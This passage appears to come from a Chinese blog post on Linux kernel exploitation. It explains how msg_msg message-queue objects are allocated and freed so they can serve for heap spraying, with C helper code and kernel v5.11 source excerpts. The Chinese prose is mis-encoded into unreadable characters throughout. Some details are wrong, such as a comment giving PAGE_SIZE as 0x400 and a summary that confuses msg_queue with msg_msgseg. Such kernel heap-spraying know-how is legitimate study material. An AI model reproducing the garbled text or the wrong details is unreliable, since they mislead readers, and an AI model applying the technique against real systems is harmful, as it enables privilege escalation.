struct msg_msg *msg, int msqflg){return 0;}\n\nstatic inline int security_msg_queue_msgrcv(struct kern_ipc_perm *msq,\n\t\t\t\t\t    struct msg_msg *msg,\n\t\t\t\t\t    struct task_struct *target,\n\t\t\t\t\t    long type, int mode){return 0;}\n//....\n#endif\t/* CONFIG_SECURITY */\n```\n\nä½†æ˜¯åœ¨`bsauce`å¸ˆå‚…æä¾›çš„ç¯å¢ƒä¸­æœ‰æ·»åŠ è¯¥é…ç½®ï¼Œè€Œ`security`æŒ‡é’ˆçš„å€¼å´è¿˜æ˜¯ä¸ºç©ºã€‚ç®€å•çœ‹äº†ä¸€ä¸‹æºç ï¼Œå¦‚ä¸‹å‡½æ•°é“¾\n\n```\nload_msg()->security_msg_msg_alloc()->lsm_msg_msg_alloc()\n```\n\nå¯¹äº`lsm_msg_msg_alloc()`å‡½æ•°å¦‚ä¸‹å®šä¹‰\n\n```c\nstatic int lsm_msg_msg_alloc(struct msg_msg *mp)\n{\n\tif (blob_sizes.lbs_msg_msg == 0) {\n\t\tmp->security = NULL;\n\t\treturn 0;\n\t}\n\n\tmp->security = kzalloc(blob_sizes.lbs_msg_msg, GFP_KERNEL);\n\tif (mp->security == NULL)\n\t\treturn -ENOMEM;\n\treturn 0;\n}\n```\n\nå¯ä»¥çœ‹åˆ°è¿™é‡Œè¿›è¡Œç›¸å…³èµ‹å€¼ï¼Œå¦‚æœæ»¡è¶³`blob_sizes.lbs_msg_msg == 0`é‚£ä¹ˆå…¶`security`æŒ‡é’ˆä¸ºç©ºï¼Œåç»­æ£€æµ‹æ—¶ä¹Ÿä¾æ®æ­¤åˆ¤æ–­ä¸æ£€æµ‹ã€‚è€Œå¯¹äºè¿™ä¸ª`blob_sizes.lbs_msg_msg`ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå¯èƒ½æ˜¯æˆ‘çš„ç›¸å…³é…ç½®é—®é¢˜å§ã€‚è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘å°±ç›´æ¥å°†è¿™ä¸ªé…ç½®å»æ‰äº†ã€‚\n\næ­¤å¤–ç»è¿‡å®é™…æµ‹è¯•ï¼Œæºç ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œå…¶å®`security`ä¹Ÿå°±æ˜¯ä¸€ä¸ªå †åœ°å€(ä»¥0x8é€’å¢)ï¼Œæ˜¯ä¸æ–­å˜åŒ–çš„ï¼Œä½†æ˜¯å¦‚æœèƒ½æ³„éœ²å‡ºå…¶ä¸­ä¸€ä¸ªï¼Œé‚£ä¹ˆåç»­æ£€æµ‹å°±èƒ½éƒ½é€šè¿‡äº†ã€‚\n\n\n\n# å‰ç½®çŸ¥è¯†\n\nå®Œæˆè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨è¿˜æ˜¯éœ€è¦ä¸€äº›å‰ç½®çŸ¥è¯†çš„ï¼Œåˆšå¥½åˆ©ç”¨è¿™ä¸ªæ¼æ´é‡æ–°å®Œå–„ä¸€ä¸‹ç›¸å…³çš„çŸ¥è¯†ç‚¹ã€‚\n\n## 1.msg_msgç»“æ„ä½“---kmalloc-16è‡³kmalloc-1024\n\nè¿™ä¸ªåœ¨ä¹‹å‰ä¹Ÿæ€»ç»“è¿‡ï¼Œä¸è¿‡æ€»ç»“å¾—æœ‰äº›é”™è¯¯ï¼Œä¹Ÿä¸å¤ªå®Œå–„ï¼Œè¿™é‡Œå†å¥½å¥½æ€»ç»“ä¸€ä¸‹\n\nå‚ç…§ï¼š[ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3's blog](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#åˆ†é…ï¼ˆGFP-KERNEL-ACCOUNTï¼‰ï¼šmsgsnd-ç³»ç»Ÿè°ƒç”¨)\n\n[Linuxå†…æ ¸ä¸­åˆ©ç”¨msg_msgç»“æ„å®ç°ä»»æ„åœ°å€è¯»å†™ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/252558)\n\n[Linuxçš„è¿›ç¨‹é—´é€šä¿¡ - æ¶ˆæ¯é˜Ÿåˆ— Â· Poor Zorro's Linux Book (gitbooks.io)](https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html)\n\nã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹\n\nè™½ç„¶å†™çš„æ˜¯æœ€å¤§`kmalloc-1024`ï¼Œä½†æ˜¯åœ¨å †å–·æ—¶ï¼Œå¯ä»¥è¿ç»­`kmalloc(1024)`ä»è€Œè·å¾—è¿ç»­çš„å †å†…å­˜åˆ†å¸ƒï¼Œè¿™æ ·éƒ½é‡Šæ”¾æ‰ä¹‹åå†ç»è¿‡å›æ”¶æœºåˆ¶å°±å¯ä»¥ç”³è¯·åˆ°æ›´å¤§çš„`kmallo-xx`äº†ã€‚\n\n### (1)ä½¿ç”¨æ–¹æ³•\n\n#### â‘ åˆ›å»º\n\n- é¦–å…ˆåˆ›å»º`queue_id`ç®¡ç†æ ‡å¿—ï¼Œå¯¹åº”äºå†…æ ¸ç©ºé—´çš„`msg_queue`ç®¡ç†ç»“æ„\n\n  ```c\n  //keyè¦ä¹ˆä½¿ç”¨ftok()ç®—æ³•ç”Ÿæˆ,è¦ä¹ˆæŒ‡å®šä¸ºIPC_PRIVATE\n  //ä»£è¡¨ç€è¯¥æ¶ˆæ¯é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­å”¯ä¸€çš„æ ‡è¯†ç¬¦\n  //ä½¿ç”¨IPC_PRIVATEä¼šç”Ÿæˆå…¨æ–°çš„æ¶ˆæ¯é˜Ÿåˆ—IPCå¯¹è±¡\n  int32_t make_queue(key_t key, int msg_flag)\n  {\n      int32_t result;\n      if ((result = msgget(key, msg_flag)) == -1) \n      {\n          perror(\"msgget failure\");\n          exit(-1);\n      }\n      return result;\n  }\n  \n  int queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n  ```\n\n  ä½¿ç”¨ç®€å•å°è£…çš„`msgget`å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å·`__NR_msgget`ï¼Œä¹‹åä¿å­˜æ•°æ®çš„æ¶ˆæ¯å°±ä¼šåœ¨è¿™ä¸ª`queue_id`ç®¡ç†æ ‡å¿—ï¼Œä»¥åŠå†…æ ¸ç©ºé—´çš„`msg_queue`ç®¡ç†ç»“æ„ä¸‹è¿›è¡Œåˆ›å»º\n\n#### â‘¡æ•°æ®ä¼ è¾“\n\n- å†™å…¥æ¶ˆæ¯ï¼š\n\n  ç„¶åå°±å¯ä»¥ä¾æ®`queue_id`å†™å…¥æ¶ˆæ¯äº†ï¼Œä¸åŒäº`pipe`å’Œ`socketpair`ï¼Œè¿™ä¸ªéœ€è¦ç‰¹å®šçš„å°è£…å‡½æ•°ï¼ˆ`msgsnd/msgrcv`ï¼‰æˆ–è€…å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆ`__NR_msgrcv/__NR_msgsnd`ï¼‰æ¥å®ç°ã€‚\n\n  ```c\n  typedef struct\n  {\n          long mtype;\n          char mtext[1];\n  }msgp;\n  \n  //msg_bufå®é™…ä¸Šä¸ºmsgp,é‡Œé¢åŒ…å«mtype,è¿™ä¸ªmtypeåœ¨åé¢çš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨\n  void send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n  {\n      if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n      {\n          perror(\"msgsend failure\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_send_buf[0x2000];\n  m_ts_size = 0x400-0x30;//ä»»æ„æŒ‡å®š\n  msg *message = (msg *)queue_send_buf;\n  message->mtype = 0;\n  send_msg(queue_id, message, m_ts_size, 0);\n  ```\n\n- è¯»å–æ¶ˆæ¯ï¼š\n\n  ä¹‹åå³å¯ä¾æ®`queue_id`è¯»å–æ¶ˆæ¯\n\n  ```c\n  void get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n  {\n      if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n      {\n          perror(\"msgrcv\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_recv_buf[0x2000];\n  m_ts_size = 0x400-0x30;//ä»»æ„æŒ‡å®š\n  get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n  ```\n\n- `mtype`\n\n  å¯é€šè¿‡è®¾ç½®è¯¥å€¼æ¥å®ç°ä¸åŒé¡ºåºçš„æ¶ˆæ¯è¯»å–ï¼Œåœ¨ä¹‹åçš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨\n\n  - åœ¨å†™å…¥æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š`mtype`ï¼Œåç»­æ¥æ”¶æ¶ˆæ¯æ—¶å¯ä»¥ä¾æ®æ­¤`mtype`æ¥è¿›è¡Œéé¡ºåºæ¥æ”¶\n  - åœ¨è¯»å–æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š`msgtyp`ï¼Œåˆ†ä¸ºå¦‚ä¸‹æƒ…å†µ\n    - `msgtyp`å¤§äº0ï¼šé‚£ä¹ˆåœ¨`find_msg`å‡½æ•°ä¸­ï¼Œå°±ä¼šå°†éå†å¯»æ‰¾æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„ç¬¬ä¸€æ¡ç­‰äº`msgtyp`çš„æ¶ˆæ¯ï¼Œç„¶åè¿›è¡Œåç»­æ“ä½œã€‚\n    - `msgtyp`ç­‰äº0ï¼šå³ç±»ä¼¼äºé¡ºåºè¯»å–ï¼Œ`find_msg`å‡½æ•°ä¼šç›´æ¥è·å–åˆ°æ¶ˆæ¯é˜Ÿåˆ—é¦–ä¸ªæ¶ˆæ¯ã€‚\n    - `msgtyp`å°äº0ï¼šä¼šå°†ç­‰å¾…çš„æ¶ˆæ¯å½“æˆä¼˜å…ˆé˜Ÿåˆ—æ¥å¤„ç†ï¼Œ`mtype`çš„å€¼è¶Šå°ï¼Œå…¶ä¼˜å…ˆçº§è¶Šé«˜ã€‚\n\n- `msg_flag`\n\nå¯ä»¥å…³æ³¨ä¸€ä¸‹`MSG_NOERROR`æ ‡å¿—ä½ï¼Œæ¯”å¦‚è¯´`msg_flag`æ²¡æœ‰è®¾ç½®`MSG_NOERROR`çš„æ—¶å€™ï¼Œé‚£ä¹ˆæƒ…å†µå¦‚ä¸‹ï¼š\n\nå‡å®šè·å–æ¶ˆæ¯æ—¶è¾“å…¥çš„é•¿åº¦`m_ts_size`ä¸º`0x200`ï¼Œä¸”è¿™ä¸ªé•¿åº¦å¤§äºé€šè¿‡`find_msg()`å‡½æ•°è·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦`0x200`ï¼Œåˆ™å¯ä»¥é¡ºåˆ©è¯»å–ï¼Œå¦‚æœè¯¥é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦`0x200`ï¼Œåˆ™ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png)\n\nä½†æ˜¯å¦‚æœè®¾ç½®äº†`MSG_NOERROR`ï¼Œé‚£ä¹ˆå³ä½¿ä¼ å…¥æ¥æ”¶æ¶ˆæ¯çš„é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦ï¼Œä»ç„¶å¯ä»¥é¡ºåˆ©è·å–ï¼Œä½†æ˜¯å¤šä½™çš„æ¶ˆæ¯ä¼šè¢«æˆªæ–­ï¼Œç›¸å…³å†…å­˜è¿˜æ˜¯ä¼šè¢«é‡Šæ”¾ï¼Œè¿™ä¸ªåœ¨æºä»£ç ä¸­ä¹Ÿæœ‰æ‰€ä½“ç°ã€‚\n\n```c\n//v5.11 /ipc/msg.c do_msgrcvå‡½æ•°ä¸­\nif ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n    msg = ERR_PTR(-E2BIG);\n    goto out_unlock0;\n}\n```\n\næ­¤å¤–è¿˜æœ‰æ›´å¤šçš„`msg_flag`ï¼Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚\n\n#### â‘¢é‡Šæ”¾\n\nè¿™ä¸ªä¸»è¦æ˜¯ç”¨åˆ°`msgctl`å°è£…å‡½æ•°æˆ–è€…`__NR_msgctl`ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥é‡Šæ”¾æ‰æ‰€æœ‰çš„æ¶ˆæ¯ç»“æ„ï¼ŒåŒ…æ‹¬ç”³è¯·çš„`msg_queue`çš„ç»“æ„\n\n```c\n//å…¶ä¸­IPC_RMIDè¿™ä¸ªcmdå‘½ä»¤ä»£è¡¨é‡Šæ”¾æ‰è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„æ‰€æœ‰æ¶ˆæ¯,å„ç§å†…å­˜ç»“æ„ä½“ç­‰\nif(msgctl(queue_id,IPC_RMID,NULL)==-1)\n{\n    perror(\"msgctl\");\n    exit(-1);\n}\n```\n\nä¸è¿‡ä¸€èˆ¬ä¹Ÿç”¨ä¸åˆ°ï¼Œå¯èƒ½æŸäº›åˆå¹¶objçš„æƒ…å†µèƒ½ç”¨åˆ°?\n\næ­¤å¤–è¿˜æœ‰æ›´å¤šçš„`cmd`å‘½ä»¤ï¼Œå¸¸ç”¨æ¥è®¾ç½®å†…æ ¸ç©ºé—´çš„`msg_queue`ç»“æ„ä¸Šçš„ç›¸å…³æ•°æ®ï¼Œä¸è¿‡å¤šä»‹ç»äº†ã€‚\n\n#### æ€»ç»“\n\næ€»ç»“ä¸€ä¸‹å¤§è‡´çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹\n\n```c\ntypedef struct\n{\n        long mtype;\n        char mtext[1];\n}msgp;\n\nint32_t make_queue(key_t key, int msg_flag)\n{\n    int32_t result;\n    if ((result = msgget(key, msg_flag)) == -1) \n    {\n        perror(\"msgget failure\");\n        exit(-1);\n    }\n    return result;\n}\n\n\n\nvoid get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n{\n    if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n    {\n        perror(\"msgrcv\");\n        exit(-1);\n    }\n    return;\n}\n\nvoid send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n{\n    if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n    {\n        perror(\"msgsend failure\");\n        exit(-1);\n    }\n    return;\n}\n\n\nint main()\n{\n    int queue_id, m_ts_size;\n    char queue_recv_buf[0x2000];\n    char queue_send_buf[0x2000];\n    \n    m_ts_size = 0x400-0x30;\n    msgp *message = (msgp *)queue_send_buf;\n    message->mtype = 0;\n    \n    memset(message->mtext,'\\xaa', m_ts_size);\n    memset(queue_recv_buf, '\\xbb', sizeof(queue_recv_buf));\n    \n    queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n    send_msg(queue_id, message, m_ts_size, 0);\n    get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n    \n    return 0;\n}\n```\n\n### (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾\n\n#### â‘ åˆ›å»º\n\n##### A.å†…å­˜ç”³è¯·\n\n- è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»º`msg_queue`ç»“æ„ä½“ï¼Œä½¿ç”¨`msgget`å‡½æ•°ï¼Œè°ƒç”¨é“¾ä¸º\n\n  ```\n  msgget(key,msg_flag)->ksys_msgget()->ipcget()->ipcget_new()->newque()\n  ```\n\n  ä¸»è¦è¿˜æ˜¯å…³æ³¨æœ€åçš„`newque()`å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä½¿ç”¨`kvmalloc()`ç”³è¯·å †å—ï¼Œå¤§å°ä¸º0x100ï¼Œå±äº`kmalloc-256`ï¼Œ(ä¸åŒç‰ˆæœ¬å¤§å°è²Œä¼¼ä¸åŒ)ã€‚\n\n  ```c\n  //v5.11 /ipc/msg.c\n  static int newque(struct ipc_namespace *ns, struct ipc_params *params)\n  {\n  \tstruct msg_queue *msq;\n  \tint retval;\n  \tkey_t key = params->key;\n  \tint msgflg = params->flg;\n  \n      //è¿™ä¸ªæ‰æ˜¯å®é™…ç”³è¯·çš„å †å—å†…å­˜\n  \tmsq = kvmalloc(sizeof(*msq), GFP_KERNEL);\n  \tif (unlikely(!msq))\n  \t\treturn -ENOMEM;\n  \n  \tmsq->q_perm.mode = msgflg & S_IRWXUGO;\n  \tmsq->q_perm.key = key;\n  \n  \tmsq->q_perm.security = NULL;\n      //è¿›è¡Œç›¸å…³æ³¨å†Œ\n  \tretval = security_msg_queue_alloc(&msq->q_perm);\n  \tif (retval) {\n  \t\tkvfree(msq);\n  \t\treturn retval;\n  \t}\n  \n      //åˆå§‹åŒ–\n  \tmsq->q_stime = msq->q_rtime = 0;\n  \tmsq->q_ctime = ktime_get_real_seconds();\n  \tmsq->q_cbytes = msq->q_qnum = 0;\n  \tmsq->q_qbytes = ns->msg_ctlmnb;\n  \tmsq->q_lspid = msq->q_lrpid = NULL;\n  \tINIT_LIST_HEAD(&msq->q_messages);\n  \tINIT_LIST_HEAD(&msq->q_receivers);\n  \tINIT_LIST_HEAD(&msq->q_senders);\n  \n      //ä¸‹é¢ä¸€å †çœ‹ä¸æ‡‚åœ¨å¹²å•¥\n  \t/* ipc_addid() locks msq upon success. */\n  \tretval = ipc_addid(&msg_ids(ns), &msq->q_perm, ns->msg_ctlmni);\n  \tif (retval < 0) {\n  \t\tipc_rcu_putref(&msq->q_perm, msg_rcu_free);\n  \t\treturn retval;\n  \t}\n  \tipc_unlock_object(&msq->q_perm);\n  \trcu_read_unlock();\n  \n  \treturn msq->q_perm.id;\n  }\n  ```\n\n  åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º\n\n  ```c\n  //v5.11 /ipc/msg.c\n  struct msg_queue {\n      //è¿™äº›ä¸ºä¸€äº›ç›¸å…³ä¿¡æ¯\n  \tstruct kern_ipc_perm q_perm;\n  \ttime64_t q_stime;\t\t/* last msgsnd time */\n  \ttime64_t q_rtime;\t\t/* last msgrcv time */\n  \ttime64_t q_ctime;\t\t/* last change time */\n  \tunsigned long q_cbytes;\t\t/* current number of bytes on queue */\n  \tunsigned long q_qnum;\t\t/* number of messages in queue */\n  \tunsigned long q_qbytes;\t\t/* max number of bytes on queue */\n  \tstruct pid *q_lspid;\t\t/* pid of last msgsnd */\n  \tstruct pid *q_lrpid;\t\t/* last receive pid */\n  \n      //å­˜æ”¾msg_msgç›¸å…³æŒ‡é’ˆnextã€prev,æ¯”è¾ƒé‡è¦,é€šå¸¸æ‹¿æ¥æº¢å‡ºåˆ¶é€ UAF\n      //å’Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„æ‰€æœ‰æ¶ˆæ¯ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨\n  \tstruct list_head q_messages;\n  \tstruct list_head q_receivers;\n  \tstruct list_head q_senders;\n  } __randomize_layout;\n  \n  ```\n\n- æ¥ç€å½“ä½¿ç”¨`msgsnd`å‡½æ•°ä¼ é€’æ¶ˆæ¯æ—¶ï¼Œä¼šåˆ›å»ºæ–°çš„`msg_msg`ç»“æ„ä½“ï¼Œæ¶ˆæ¯è¿‡é•¿çš„è¯å°±ä¼šåˆ›å»ºæ›´å¤šçš„`msg_msgseg`æ¥å­˜å‚¨æ›´å¤šçš„æ¶ˆæ¯ã€‚ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š\n\n  ```c\n  msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)->do_msgsnd()->load_msg()->alloc_msg()\n  ```\n\n  ä¸»è¦è¿˜æ˜¯å…³æ³¨åœ¨`alloc_msg()`å‡½æ•°\n\n  ```c\n  //v5.11 /ipc/msgutil.c\n  static struct msg_msg *alloc_msg(size_t len)\n  {\n  \tstruct msg_msg *msg;\n  \tstruct msg_msgseg **pseg;\n  \tsize_t alen;\n  \n      //æœ€å¤§å‘é€DATALEN_MSGé•¿åº¦çš„æ¶ˆæ¯\n      //#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n      //è¿™é‡Œçš„PAGE_SIZEä¸º0x400,å³æœ€å¤škmalloc-\n  \talen = min(len, DATALEN_MSG);\n      //ä½¿ç”¨æ­£å¸¸\n  \tmsg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);\n  \tif (msg == NULL)\n  \t\treturn NULL;\n  \n      //å¦‚æœä¼ å…¥æ¶ˆæ¯é•¿åº¦è¶…è¿‡0x400-0x30,å°±å†è¿›è¡Œç”³è¯·msg_msgsegã€‚\n      //ä½¿ç”¨kmallocç”³è¯·,æ ‡å¿—ä¸ºGFP_KERNEL_ACCOUNTã€‚\n      //æœ€å¤§ä¹Ÿä¸º0x400,ä¹Ÿå±äºkmalloc-1024\n      //è¿˜æœ‰å†é•¿çš„æ¶ˆæ¯,å°±å†ç”³è¯·msg_msgseg\n  \tmsg->next = NULL;\n  \tmsg->security = NULL;\n  \tlen -= alen;\n  \tpseg = &msg->next;\n  \twhile (len > 0) {\n  \t\tstruct msg_msgseg *seg;\n  \t\t//ä¸çŸ¥é“å¹²å•¥çš„\n  \t\tcond_resched();\n  \n  \t\talen = min(len, DATALEN_SEG);\n  \t\tseg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);\n          //ç”³è¯·å®Œä¹‹å,å°†msg_msgsegæ”¾åˆ°msg->nextè¿™ä¸ªå•å‘é“¾è¡¨ä¸Š\n  \t\tif (seg == NULL)\n  \t\t\tgoto out_err;\n  \t\t*pseg = seg;\n  \t\tseg->next = NULL;\n  \t\tpseg = &seg->next;\n  \t\tlen -= alen;\n  \t}\n  \n  \treturn msg;\n  \n  out_err:\n  \tfree_msg(msg);\n  \treturn NULL;\n  }\n  ```\n\n  - `msg_msg`ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¤´éƒ¨å¤§å°`0x30`\n\n    ```c\n    //v5.11 /include/linux/msg.h\n    struct msg_msg {\n    \tstruct list_head m_list;//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨\n    \tlong m_type;\n    \tsize_t m_ts;\t\t/* message text size */\n    \tstruct msg_msgseg *next;//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg\n    \tvoid *security;\n    \t/* the actual message follows immediately */\n    };\n    ```\n\n    å¦‚ä¸‹æ‰€ç¤º\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png\" alt=\"image-20220511220130886\" style=\"zoom:80%;\" />\n\n  - `msg_msgseq`ç»“æ„å¦‚ä¸‹ï¼Œåªæ˜¯ä¸€ä¸ª`struct msg_msgseg*`æŒ‡é’ˆ\n\n    ```c\n    //v5.11 /ipc/msgutil.c\n    struct msg_msgseg {\n    \tstruct msg_msgseg *next;\n    \t/* the next part of the message follows immediately */\n    };\n    ```\n\n    å¦‚ä¸‹æ‰€ç¤º\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png\" alt=\"image-20220511220627775\" style=\"zoom:80%;\" />\n\n###### ç›¸å…³å†…å­˜ç»“æ„ï¼š\n\nåœ¨ä¸€ä¸ª`msg_queue`é˜Ÿåˆ—ä¸‹ï¼Œæ¶ˆæ¯é•¿åº¦ä¸º`0x1000-0x30-0x8-0x8-0x8`\n\n- ä¸€æ¡æ¶ˆæ¯ï¼š\n\n  ![image-20220511231539231](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png)\n\n- ä¸¤æ¡æ¶ˆæ¯ï¼š\n\n  ä»¥`msg_queue`çš„`struct list_head q_messages;`åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ`msg_msg`ç»“æ„çš„`struct list_head m_list`åŸŸä¸²è”æ‰€æœ‰çš„`msg_msg`å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨\n\n  ![æœªå‘½åæ–‡ä»¶](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png)\n\nåŒç†ï¼ŒåŒä¸€ä¸ª`msg_queue`æ¶ˆæ¯é˜Ÿåˆ—ä¸‹çš„å¤šæ¡æ¶ˆæ¯ä¹Ÿæ˜¯ç±»ä¼¼çš„\n\n###### å†…å­˜ç”³è¯·æ€»ç»“ï¼š\n\n- ä½¿ç”¨`msgget()`å‡½æ•°åˆ›å»ºå†…æ ¸ç©ºé—´çš„æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„`msg_msgseg`ï¼Œè¿”å›å€¼ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„`id`æ ‡å¿—`queue_id`\n  - `msg_msgseg`ç®¡ç†æ•´ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤§å°ä¸º0x100ï¼Œ`kmalloc-256`ã€‚\n  - å…¶`struct list_head q_messages;`åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ`msg_msg`ç»“æ„çš„`struct list_head m_list`åŸŸä¸²è”æ‰€æœ‰çš„`msg_msg`å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨\n- æ¯æ¬¡åœ¨è¯¥æ¶ˆæ¯é˜Ÿåˆ—`queue_id`ä¸‹è°ƒç”¨`msgsnd()`å‡½æ•°éƒ½ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„`msg_msg`ç»“æ„ï¼Œæ¶ˆæ¯é•¿åº¦å¤§äº`0x400-0x30`å°±ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„`msg_msgseg`ç»“æ„\n  - `msg_msg`ä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼Œä¸`msg_queue`å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸`msg_msgseg`å½¢æˆå•å‘é“¾è¡¨å¤§å°æœ€å¤§ä¸º0x400ï¼Œå±äº`kmalloc-64`è‡³`kmalloc-1024`\n  - `msg_msgseg`ä¹Ÿä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼ŒæŒ‚åœ¨`msg_msg`å•å‘é“¾è¡¨ä¸­ï¼Œå¤§å°æœ€å¤§ä¸º`0x400`ï¼Œå±äº`kmalloc-16`è‡³`kmalloc-1024`ï¼Œå½“æ¶ˆæ¯é•¿åº¦å¾ˆé•¿æ—¶å°±ä¼šç”³è¯·å¾ˆå¤šçš„å†…æ ¸ç©ºé—´çš„`msg_msgseg`ç»“æ„ã€‚\n\n\n\n##### B.æ•°æ®å¤åˆ¶\n\nè°ƒç”¨å®Œ`alloc_msg()`å‡½æ•°åï¼Œå›åˆ°`load_msg()`å‡½æ•°æ¥ç€è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œå‡½æ•°è¿˜æ˜¯æŒºç®€å•çš„ã€‚\n\n```c\nstruct msg_msg *load_msg(const void __user *src, size_t len)\n{\n\tstruct msg_msg *msg;\n\tstruct msg_msgseg *seg;\n\tint err = -EFAULT;\n\tsize_t alen;\n\n\tmsg = alloc_msg(len);\n\tif (msg == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n    //å…ˆå¤åˆ¶è¿›msg_msgä¸­å­˜æ”¾æ¶ˆæ¯çš„éƒ¨åˆ†\n\talen = min(len, DATALEN_MSG);\n\tif (copy_from_user(msg + 1, src, alen))\n\t\tgoto out_err;\n\n    //éå†msg_msgä¸‹çš„msg_msgseg,é€ä¸ªå­˜æ”¾æ•°æ®è¿›å»\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tsrc = (char __user *)src + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_from_user(seg + 1, src, alen))\n\t\t\tgoto out_err;\n\t}\n\n\terr = security_msg_msg_alloc(msg);\n\tif (err)\n\t\tgoto out_err;\n\n\treturn msg;\n\nout_err:\n\tfree_msg(msg);\n\treturn ERR_PTR(err);\n}\n```\n\n\n\n#### â‘¡é‡Šæ”¾\n\nç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾\n\n```\nmsgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)->SYS_msgrcv()->ksys_msgrcv()->do_msgrcv()->do_msg_fill()->store_msg()\n```\n\né¦–å…ˆå…³æ³¨ä¸€ä¸‹`do_msgrcv()`å‡½æ•°ï¼Œé‡Œé¢å¾ˆå¤šä¸œè¥¿éƒ½æ¯”è¾ƒé‡è¦\n\n```c\nstatic long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,\n                      long (*msg_handler)(void __user *, struct msg_msg *, size_t))\n{\n    int mode;\n    struct msg_queue *msq;\n    struct ipc_namespace *ns;\n    struct msg_msg *msg, *copy = NULL;\n    DEFINE_WAKE_Q(wake_q);\n    //....\n    if (msqid < 0 